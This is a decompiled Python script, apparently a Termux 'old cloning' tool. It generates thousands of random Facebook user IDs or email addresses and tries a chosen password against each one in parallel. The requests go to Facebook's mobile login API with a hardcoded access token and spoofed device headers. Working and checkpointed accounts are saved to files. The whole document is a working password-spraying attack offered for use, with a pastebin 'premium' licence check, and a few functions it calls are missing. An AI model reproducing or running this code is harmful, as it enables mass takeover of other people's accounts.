# Decompile by Mardis (Tools By Kapten-Kaizo)
# Time Succes decompile : 2022-04-12 12:45:46.252763

W = '\033[97;1m' 
R = '\033[91;1m' 
G = '\033[92;1m' 
Y = '\033[93;1m' 
B = '\033[94;1m'
P = '\033[95;1m'
C = '\033[96;1m'
N = '\x1b[0m'



import os
try:
	import requests
except ImportError:
	os.system("pip install requests")

try:
	import concurrent.futures
except ImportError:
	os.system("pip install futures")

import os
import sys
import time
import requests
import random
import platform
import base64
import subprocess
from concurrent.futures import ThreadPoolExecutor


def runtxt(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)



def helpnote():
	subprocess.check_output(["am", "start", "https://www.facebook.com/ZM.777.HERO"])
	exit(" [*] FACEBOOK :  https://www.facebook.com/ZM.777.HERO")

def aprove():
	runtxt("\n\033[0;92m        YOUR ARE PREMIUM USER:) ")
	runtxt("\033[0;97m FOR MORE INFORMATION CONTACT OWNER ")
	subprocess.check_output(["am", "start", "https://www.facebook.com/ZM.777.HERO"])
def notice():
	runtxt("\n\033[0;91m        YOUR TOKEN IS NOT APPROVED :) ")
	runtxt("\033[0;97m COPY THIS TOKEN AND SEND OWNER TO GET PREMIUM  %s%s"%(G,basesplit))
	subprocess.check_output(["am", "start", "https://www.facebook.com/ZM.777.HERO"])


        
plist = (platform.uname())[2]
basex = plist
basex1 = basex.encode('ascii')
basex2 = base64.b64encode(basex1)
basex3 = basex2.decode('ascii')
base4 = (basex3).upper()
basesplit = base4.replace('=', 'X').replace('A', '3').replace('B', '9').replace('C', '7').replace('D', '1').replace('E', '4').replace('M', '2').replace('L', '6').replace('F', '8').replace('N', 'E').replace('T', '8')


class Main:
	def __init__(self):
		self.id = []
		self.ok = []
		self.cp = []
		self.loop = 0
		try:
			plr = requests.get('https://pastebin.com/raw/JJgME4Mv').text
			if basesplit in plr:
				key = basesplit
				stat = ("\033[0;92mP R E M I U M")
				FY = '\033[0;93m'
				FG = '\033[0;92m'
				GET = '\r'
			else:
				key = ("\033[0;91m -")
				stat = ("\033[0;91m FREE USER ")
				FY = '\033[0;90m'
				FG = '\033[0;90m'
				GET = '\033[0;92m [P] GET PREMIUM'
		except requests.exceptions.ConnectionError:
			print("\n%s [!] NO INTERNET CONNECTION..\n"%(R))
			exit()
		os.system("clear")
		
		print ("""   
   \033[1;36m
 \x1b[1;93m.########....###....########..####
 \x1b[1;92m......##....##.##...##.....##..##.
 \x1b[1;91m.....##....##...##..##.....##..##.
 \x1b[1;93m....##....##.....##.########...##.
 \x1b[1;92m...##.....#########.##...##....##.
 \x1b[1;91m..##......##.....##.##....##...##.
 \x1b[1;93m.########.##.....##.##.....##.####

                      
\x1b[1;91m======================\x1b[1;91m======================
\033[1;31m\033[1;37m[\x1b[1;92m+\x1b[1;97m] \x1b[1;97m Author    :        Zari Malik
\033[1;31m\033[1;37m[\x1b[1;92m+\x1b[1;97m] \x1b[1;97m Facebook  :        Zari Malik
\033[1;31m\033[1;37m[\x1b[1;92m+\x1b[1;97m] \x1b[1;97m GitHub    :        ZM-HERO
\033[1;31m\033[1;37m[\x1b[1;92m+\x1b[1;97m] \x1b[1;97m Tool      :        Old Crack
\033[1;31m======================\033[1;31m======================
\x1b[0;91m\x1b[1;47m          O L D   C L O N I N G          \x1b[0m\n
\033[1;34m  """)
		print("\n%s [%s1%s]%s CRACK FROM 2009-12 %s(FREE)"%(W,G,W,W,G))
		print("%s [%s2%s]%s CRACK FROM 2007-9 %s(PREMIUM)"%(W,G,W,W,R))
		print("%s [%s3%s]%s CRACK FROM 2005-7 %s(PREMIUM) "%(W,G,W,W,R))
		print("%s [%s4%s]%s CRACK FROM 2004 %s(PREMIUM) "%(W,G,W,W,R))
		print("%s [%s5%s]%s CRACK FROM MAIL %s(PREMIUM)"%(W,G,W,W,R))
		print("%s [%s6%s]%s CRACK RANDOM FB ID %s(PREMIUM) "%(W,G,W,W,R))
		print('\033[0;97m [\033[0;92mC\033[0;97m] \033[0;96mCHECK SUBSCRIPTION>>>')
		
		hoga = input("\n%s [%s?%s] CHOICE : %s"%(W,G,W,G))
		if hoga in ["", " "]:
			Main()
		elif hoga in ["1", "01"]:
			self.hp()
		elif hoga in ["2", "02"]:
			if basesplit in plr:
				self.hp1()
			else: 
				notice()
				exit()
		elif hoga in ["3", "03"]:
#			if basesplit in plr:
				self.hp2()
#			else: 
#				notice()
#				exit()
		elif hoga in ["4", "04"]:
			if basesplit in plr:
				self.hp3()
			else: 
				notice()
				exit()
		elif hoga in ["5", "05"]:
			if basesplit in plr:
				self.hp_mail()
			else: 
				notice()
				exit()
		elif hoga in ["6","06"]:
			if basesplit in plr:
				self.hp4()
			else:
				notice()
				exit()
		elif hoga in ["C", "c"]:
			if basesplit in plr:
			    aprove()
			    Main()
			else:
				notice()
				Main()
			    

	def hp(self):
		x = 111111111
		xx = 999999999
		idx = "100000"
		limit = int(input("\033[0;97m [\033[0;92m+\033[0;97m]\033[0;97m ENTER LIMIT \033[0;92mMAX (50000) : \033[0;92m"))
		if (limit)>50000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(G))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			print("\033[0;97m [\033[0;92m+\033[0;97m]\033[0;97m TOTAL ID -> \033[0;92m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s EXAMPLE : %s123456"%(W,G))
				listpass = input("%s [%s?%s]%s ENTER PASSWORD :%s "%(W,G,W,W,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				print("%s [%s√%s] PASS YOU CHOOSE >>> \033[0;91m%s\033[0;97m"%(W,G,W,listpass))
				print("\n%s [%s+%s]%s OK IDZ SAVED IN >>> %szari.ok.txt"%(W,G,W,W,G))
				print("%s [%s+%s]%s CP IDZ SAVED IN >>> %szari.cp.txt"%(W,R,W,W,R))
				print("%s [%s!%s] %sID RESULT NOT SHOW TURN ON AIRPLANE MODE FOR 5 SEC\x1b[0m\n"%(W,R,W,R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] THE PROCESS HAS BEEN COMPLETED..."%(G))
		except Exception as e:exit(str(e))

	def old_9(self):
		x = 111111
		xx = 999999
		idx = "100000000"
		limit = int(input("\033[0;97m [\033[0;92m+\033[0;97m]\033[0;97m ENTER LIMIT \033[0;92mMAX (50000) : \033[0;92m"))
		if (limit)>5000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			print("\033[0;97m [\033[0;92m+\033[0;97m]\033[0;97m TOTAL ID -> \033[0;92m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s EXAMPLE : %s123456"%(W,G))
				listpass = input("%s [%s?%s]%s ENTER PASSWORD :%s "%(W,G,W,W,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				print("%s [%s√%s] PASS YOU CHOOSE >>> \033[0;91m%s\033[0;97m"%(W,G,W,listpass))
				print("\n%s [%s+%s]%s OK IDZ SAVED IN >>> %szari.ok.txt"%(W,G,W,W,G))
				print("%s [%s+%s]%s CP IDZ SAVED IN >>> %szari.cp.txt"%(W,R,W,W,R))
				print("%s [%s!%s] %sID RESULT NOT SHOW TURN ON AIRPLANE MODE FOR 5 SEC\x1b[0m\n"%(W,R,W,R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] THE PROCESS HAS BEEN COMPLETED..."%(G))
		except Exception as e:exit(str(e))
		
		
	def hp1(self):
		x = 11111111
		xx = 99999999
		#idx = input("%s [+] ENTER A DIGIT (1-9): %s"%(Y,G))
		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
		limit = int(input("\033[0;97m [\033[0;92m+\033[0;97m]\033[0;97m ENTER LIMIT \033[0;92mMAX (10000): \033[0;92m"))
		if (limit)>10000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			print("\033[0;97m [\033[0;92m+\033[0;97m]\033[0;97m TOTAL ID -> \033[0;92m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s EXAMPLE : %s123456"%(W,G))
				listpass = input("%s [%s?%s]%s ENTER PASSWORD :%s "%(W,G,W,W,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				print("%s [%s√%s] PASS YOU CHOOSE >>> \033[0;91m%s\033[0;97m"%(W,G,W,listpass))
				print("\n%s [%s+%s]%s OK IDZ SAVED IN >>> %szari.ok.txt"%(W,G,W,W,G))
				print("%s [%s+%s]%s CP IDZ SAVED IN >>> %szari.cp.txt"%(W,R,W,W,R))
				print("%s [%s!%s] %sID RESULT NOT SHOW TURN ON AIRPLANE MODE FOR 5 SEC\x1b[0m\n"%(W,R,W,R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] THE PROCESS HAS BEEN COMPLETED..."%(G))
		except Exception as e:exit(str(e))


	def hp2(self):
		x = 1111111
		xx = 9999999
		#idx = input("%s [+] ENTER A DIGIT (1-9): %s"%(Y,G))
		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
		limit = int(input("\033[0;97m [\033[0;92m+\033[0;97m]\033[0;97m ENTER LIMIT \033[0;92mMAX (10000): \033[0;92m"))
		if (limit)>10000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			print("\033[0;97m [\033[0;92m+\033[0;97m]\033[0;97m TOTAL ID -> \033[0;92m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s EXAMPLE : %s123456"%(W,G))
				listpass = input("%s [%s?%s]%s ENTER PASSWORD :%s "%(W,G,W,W,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				print("%s [%s√%s] PASS YOU CHOOSE >>> \033[0;91m%s\033[0;97m"%(W,G,W,listpass))
				print("\n%s [%s+%s]%s OK IDZ SAVED IN >>> %szari.ok.txt"%(W,G,W,W,G))
				print("%s [%s+%s]%s CP IDZ SAVED IN >>> %szari.cp.txt"%(W,R,W,W,R))
				print("%s [%s!%s] %sID RESULT NOT SHOW TURN ON AIRPLANE MODE FOR 5 SEC\x1b[0m\n"%(W,R,W,R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] THE PROCESS HAS BEEN COMPLETED..."%(G))
		except Exception as e:exit(str(e))
		

	def hp3(self):
		x = 111111
		xx = 999999
		#idx = input("%s [+] ENTER A DIGIT (1-9): %s"%(Y,G))
		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
		limit = int(input("\033[0;97m [\033[0;92m+\033[0;97m]\033[0;97m ENTER LIMIT \033[0;92mMAX (10000): \033[0;92m"))
		if (limit)>10000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			print("\033[0;97m [\033[0;92m+\033[0;97m]\033[0;97m TOTAL ID -> \033[0;92m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s EXAMPLE : %s123456"%(W,G))
				listpass = input("%s [%s?%s]%s ENTER PASSWORD :%s "%(W,G,W,W,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				print("%s [%s√%s] PASS YOU CHOOSE >>> \033[0;91m%s\033[0;97m"%(W,G,W,listpass))
				print("\n%s [%s+%s]%s OK IDZ SAVED IN >>> %szari.ok.txt"%(W,G,W,W,G))
				print("%s [%s+%s]%s CP IDZ SAVED IN >>> %szari.cp.txt"%(W,R,W,W,R))
				print("%s [%s!%s] %sID RESULT NOT SHOW TURN ON AIRPLANE MODE FOR 5 SEC\x1b[0m\n"%(W,R,W,R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] THE PROCESS HAS BEEN COMPLETED..."%(G))
		except Exception as e:exit(str(e))


	def hp_mail(self):
		x = 111
		xx = 999
		nam = input("%s [%s?%s] TYPE A NAME %s: %s"%(W,R,W,R,P))
		nam = nam.replace(" ", "")
		print("%s EXAMPLE  : %s@gmail.com, %s@yahoo.com, %s@hotmail.com "%(W,Y,G,R))
		idx = input("%s DOMAIN  :%s "%(W,G))
		limit = int(input("\033[0;97m [\033[0;92m+\033[0;97m]\033[0;97m ENTER LIMIT \033[0;92mMAX (50000): \033[0;92m"))
		if (limit)>50000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				___ = nam
				self.id.append(___+str(_)+__)
			print("\033[0;97m [\033[0;92m+\033[0;97m]\033[0;97m TOTAL ID -> \033[0;92m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s EXAMPLE : %s123456"%(W,G))
				listpass = input("%s [%s?%s]%s ENTER PASSWORD :%s "%(W,G,W,W,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				print("%s [%s√%s] PASS YOU CHOOSE >>> \033[0;91m%s\033[0;97m"%(W,G,W,listpass))
				print("\n%s [%s+%s]%s OK IDZ SAVED IN >>> %szari.ok.txt"%(W,G,W,W,G))
				print("%s [%s+%s]%s CP IDZ SAVED IN >>> %szari.cp.txt"%(W,R,W,W,R))
				print("%s [%s!%s] %sID RESULT NOT SHOW TURN ON AIRPLANE MODE FOR 5 SEC\x1b[0m\n"%(W,R,W,R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] THE PROCESS HAS BEEN COMPLETED..."%(G))
		except Exception as e:exit(str(e))
		
	def hp4(self):
		x = 11111111
		xx = 99999999
		idx = input("%s [%s+%s] ENTER A DIGIT (1-9): %s"%(W,G,W,P))
		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
		limit = int(input("\033[0;97m [\033[0;92m+\033[0;97m]\033[0;97m ENTER LIMIT \033[0;92mMAX (10000): \033[0;92m"))
		if (limit)>10000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			print("\033[0;97m [\033[0;92m+\033[0;97m]\033[0;97m TOTAL ID -> \033[0;92m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s EXAMPLE : %s123456"%(W,G))
				listpass = input("%s [%s?%s]%s ENTER PASSWORD :%s "%(W,G,W,W,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				print("%s [%s√%s] PASS YOU CHOOSE >>> \033[0;91m%s\033[0;97m"%(W,G,W,listpass))
				print("\n%s [%s+%s]%s OK IDZ SAVED IN >>> %szari.ok.txt"%(W,G,W,W,G))
				print("%s [%s+%s]%s CP IDZ SAVED IN >>> %szari.cp.txt"%(W,R,W,W,R))
				print("%s [%s!%s] %sID RESULT NOT SHOW TURN ON AIRPLANE MODE FOR 5 SEC\x1b[0m\n"%(W,R,W,R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] THE PROCESS HAS BEEN COMPLETED..."%(G))
		except Exception as e:exit(str(e))
		

	def api(self, uid, pwx):
		ua = random.choice([
			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]", 
			"Mozilla/5.0 (Linux; Android 10; Infinix X683) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
		])
		sys.stdout.write(
			"\r\r%s\033[0;97mZARI\033[0;97m %s/%s  \033[0;92mOK>>[%s] | \033[0;91mCP>>[%s]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			headers = {
				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
				"x-fb-net-hni": str(random.randint(20000, 40000)), 
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent": ua, 
				"content-type": "application/x-www-form-urlencoded", 
				"x-fb-http-engine": "Liger"
			}
			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m😍(ZARI-OK) %s | %s"%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" ZARI-OK %s | %s"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;95m🥺(ZARI-CP) %s | %s"%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" ZARI-CP %s | %s"%(uid, pw))
				uploadcps()
				break
			else:
				continue

		self.loop +=1

if len(sys.argv) == 2:
	if sys.argv[1] == "--help" or sys.argv[1] == "-h":
		helpnote()
	else:
		Main()

try:Main()
except Exception as e:exit(str(e))



